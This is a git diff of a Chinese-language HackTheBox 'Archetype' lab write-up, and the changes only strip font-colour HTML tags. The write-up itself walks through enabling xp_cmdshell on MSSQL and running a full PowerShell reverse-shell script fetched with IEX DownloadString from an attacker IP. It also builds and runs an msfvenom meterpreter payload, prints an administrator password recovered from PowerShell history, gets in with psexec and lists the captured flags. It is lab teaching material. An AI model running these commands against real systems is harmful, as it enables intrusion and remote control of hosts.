@@ -81,12 +81,12 @@ python mssqlclient.py ARCHETYPE/sql_svc@10.129.219.58 -windows-auth
 
 ![](/image/hackthebox/Archetype-9.png)
 
-**<font style="color:rgb(13, 13, 13);">ARCHETYPE/sql_svc</font>**<font style="color:rgb(13, 13, 13);"> 是一个 Windows 认证的用户名，它的格式通常是 </font>**<font style="color:rgb(13, 13, 13);">域/用户名</font>**<font style="color:rgb(13, 13, 13);">。在这种格式中，</font>**<font style="color:rgb(13, 13, 13);">ARCHETYPE</font>**<font style="color:rgb(13, 13, 13);"> 是 Windows 域的名称，而 </font>**<font style="color:rgb(13, 13, 13);">sql_svc</font>**<font style="color:rgb(13, 13, 13);"> 是该域中的用户名。</font>
+**ARCHETYPE/sql_svc** 是一个 Windows 认证的用户名，它的格式通常是 **域/用户名**。在这种格式中，**ARCHETYPE** 是 Windows 域的名称，而 **sql_svc** 是该域中的用户名。
 
-**<font style="color:rgb(13, 13, 13);">-windows-auth</font>**<font style="color:rgb(13, 13, 13);"> 表示你要使用 Windows 身份验证来连接到 SQL Server，而不是使用 SQL Server 身份验证（即用户名和密码）。</font>
+**-windows-auth** 表示你要使用 Windows 身份验证来连接到 SQL Server，而不是使用 SQL Server 身份验证（即用户名和密码）。
 
-## <font style="color:rgb(13, 13, 13);">TASK 5</font>
-<font style="color:rgb(13, 13, 13);"></font>
+## TASK 5
+
 
 ![](/image/hackthebox/Archetype-10.png)
 
@@ -94,22 +94,22 @@ python mssqlclient.py ARCHETYPE/sql_svc@10.129.219.58 -windows-auth
 
 ![](/image/hackthebox/Archetype-11.png)
 
-<font style="color:rgb(0, 0, 0);">成功登录之后可以通过输入以下命令判断当前时候拥有sysadmin权限</font>
+成功登录之后可以通过输入以下命令判断当前时候拥有sysadmin权限
 
-<font style="color:rgb(0, 0, 0);">SELECT IS_SRVROLEMEMBER('sysadmin')</font>
+SELECT IS_SRVROLEMEMBER('sysadmin')
 
 ![](/image/hackthebox/Archetype-12.png)
 
-<font style="color:rgb(0, 0, 0);">1代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">xp_cmdshell</font><font style="color:rgb(0, 0, 0);">来进行远程代码执行</font>
+1代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行
 
-<font style="color:rgb(0, 0, 0);">先使用sp_configure命令查看下配置情况，如果配置表里没有xp_cmdshell一栏，使用如下命令。</font>
+先使用sp_configure命令查看下配置情况，如果配置表里没有xp_cmdshell一栏，使用如下命令。
 
 ```sql
 EXEC sp_configure 'Show Advanced Options', 1;			\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项
 reconfigure;			\\确认上面操作
 ```
 
-<font style="color:rgb(0, 0, 0);">再用sp_configure 命令查看下此时的xp_cmdshell命令是否被允许使用，如值为0使用如下命令。</font>
+再用sp_configure 命令查看下此时的xp_cmdshell命令是否被允许使用，如值为0使用如下命令。
 
 ```sql
 EXEC sp_configure 'xp_cmdshell', 1						\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令
@@ -122,31 +122,31 @@ xp_cmdshell "whoami"
 
 ![](/image/hackthebox/Archetype-13.png)
 
-<font style="color:rgb(13, 13, 13);">虽然 </font>**<font style="color:rgb(13, 13, 13);">xp_cmdshell</font>**<font style="color:rgb(13, 13, 13);"> 存储过程允许在 SQL Server 中执行一些操作系统级别的命令，但它的功能是受到限制的，并且在安全性上也存在一些风险。因此，有时候需要直接的操作系统shell来进行更多和更复杂的操作。所以我们要反弹shell</font>
+虽然 **xp_cmdshell** 存储过程允许在 SQL Server 中执行一些操作系统级别的命令，但它的功能是受到限制的，并且在安全性上也存在一些风险。因此，有时候需要直接的操作系统shell来进行更多和更复杂的操作。所以我们要反弹shell
 
-<font style="color:rgb(13, 13, 13);">启动py共享文件</font>
+启动py共享文件
 
-<font style="color:rgb(234, 234, 234);background-color:rgb(0, 0, 0);">python3 -m http.server 80</font>
+python3 -m http.server 80
 
-<font style="color:rgb(234, 234, 234);background-color:rgb(0, 0, 0);">shell.ps1</font>
+shell.ps1
 
 ```sql
 $client = New-Object System.Net.Sockets.TCPClient("10.10.16.20",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-<font style="color:rgb(13, 13, 13);">xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.20/shell.ps1\");"</font>
+xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.20/shell.ps1\");"
 
 nc -nvlp 443
 
 ![](/image/hackthebox/Archetype-14.png)
 
-<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">在</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">C:\Users\sql_svc\Desktop\user.txt</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">中找到User Own的Flag</font>
+在C:\Users\sql_svc\Desktop\user.txt中找到User Own的Flag
 
 3e7b102e78218e935bf3f4951fec21a3
 
 ![](/image/hackthebox/Archetype-15.png)
 
-<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">发现sql_svc是操作系统普通用户、数据库以及数据库服务用户，检查一下频繁访问的文件或已执行的命令，使用如下命令来访问PowerShell历史记录文件</font>
+发现sql_svc是操作系统普通用户、数据库以及数据库服务用户，检查一下频繁访问的文件或已执行的命令，使用如下命令来访问PowerShell历史记录文件
 
 ```sql
 type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -154,13 +154,13 @@ type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Co
 
 ![](/image/hackthebox/Archetype-16.png)
 
-<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">发现管理员账号及密码</font>
+发现管理员账号及密码
 
-<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">administrator MEGACORP_4dm1n!!</font>
+administrator MEGACORP_4dm1n!!
 
-<font style="color:rgb(234, 234, 234);background-color:rgb(0, 0, 0);"></font>
 
-## <font style="color:rgb(13, 13, 13);">TASK 6</font>
+
+## TASK 6
 ![](/image/hackthebox/Archetype-17.png)
 
 这里win和Linux都有一个很好的提权脚本叫PEAS
@@ -169,37 +169,37 @@ Linux系统叫linpeas，win系统叫winpeas
 
 Git下载地址：[https://github.com/carlospolop/PEASS-ng/releases/tag/20220710](https://github.com/carlospolop/PEASS-ng/releases/tag/20220710)
 
-<font style="color:rgb(68, 68, 68);">（著名的windows信息枚举以发现存在的漏洞）</font>
+（著名的windows信息枚举以发现存在的漏洞）
 
-<font style="color:rgb(68, 68, 68);">将其下载到linux本机</font>
+将其下载到linux本机
 
-<font style="color:rgb(0, 0, 255);">wget </font>[<font style="color:rgb(68, 68, 68);">https://github.com/carlospolop/PEASS-ng/releases/download/20220320/winPEASx86.exe</font>](https://github.com/carlospolop/PEASS-ng/releases/download/20220320/winPEASx86.exe)
+wget [https://github.com/carlospolop/PEASS-ng/releases/download/20220320/winPEASx86.exe](https://github.com/carlospolop/PEASS-ng/releases/download/20220320/winPEASx86.exe)
 
-<font style="color:rgb(68, 68, 68);">利用msf反弹shell</font>
+利用msf反弹shell
 
-<font style="color:rgb(68, 68, 68);">msfvenom -p  windows/meterpreter/reverse_tcp LHOST=</font><font style="color:rgb(13, 13, 13);">10.10.16.20</font><font style="color:rgb(68, 68, 68);"> -f exe -o payload.exe</font>
+msfvenom -p  windows/meterpreter/reverse_tcp LHOST=10.10.16.20 -f exe -o payload.exe
 
-<font style="color:rgb(68, 68, 68);">在kali Linux本地运行http服务器（用python http模块）</font>
+在kali Linux本地运行http服务器（用python http模块）
 
-<font style="color:rgb(68, 68, 68);">SQL> xp_cmdshell "powershell wget http://</font><font style="color:rgb(13, 13, 13);">10.10.16.20</font><font style="color:rgb(68, 68, 68);">/payload.exe -OutFile c:\\Users\Public\\payload.exe"</font>
+SQL> xp_cmdshell "powershell wget http://10.10.16.20/payload.exe -OutFile c:\\Users\Public\\payload.exe"
 
-<font style="color:rgb(68, 68, 68);">set payload windows/meterpreter/reverse_tcp</font>
+set payload windows/meterpreter/reverse_tcp
 
-<font style="color:rgb(68, 68, 68);">set lhost </font><font style="color:rgb(13, 13, 13);">10.10.16.20</font>
+set lhost 10.10.16.20
 
-<font style="color:rgb(13, 13, 13);">EXEC xp_cmdshell 'C:\Users\Public\payload.exe';</font>
+EXEC xp_cmdshell 'C:\Users\Public\payload.exe';
 
-<font style="color:rgb(13, 13, 13);">run（进行监听）</font>
+run（进行监听）
 
 EXEC xp_cmdshell 'C:\Users\Public\payload.exe';  进行执行
 
 ![](/image/hackthebox/Archetype-18.png)
 
-<font style="color:rgb(68, 68, 68);">成功获得user的flag</font>
+成功获得user的flag
 
-<font style="color:rgb(68, 68, 68);"></font>
 
-也可以尝试<font style="color:rgb(0, 0, 0);">直接使用Impacket中的</font>psexec提权，其原理是：
+
+也可以尝试直接使用Impacket中的psexec提权，其原理是：
 
 > 1.通过ipc$连接，释放psexecsvc.exe到目标
 >
@@ -214,15 +214,15 @@ EXEC xp_cmdshell 'C:\Users\Public\payload.exe';  进行执行
 
 
 
-<font style="color:rgb(0, 0, 0);">也可以</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">psexec.py</font><font style="color:rgb(0, 0, 0);">来提权</font>
+也可以psexec.py来提权
 
-<font style="color:rgb(0, 0, 0);">psexec.py administrator@10.10.10.27</font>
+psexec.py administrator@10.10.10.27
 
 ![](/image/hackthebox/Archetype-19.png)
 
-<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">执行 </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">type C:\Users\Administrator\Desktop\root.txt</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);"> 命令成功拿到System Own的Flag</font>
+执行 type C:\Users\Administrator\Desktop\root.txt 命令成功拿到System Own的Flag
 
-<font style="color:rgb(0, 0, 0);"></font>
 
-<font style="color:rgb(0, 0, 0);"></font>
+
+
 
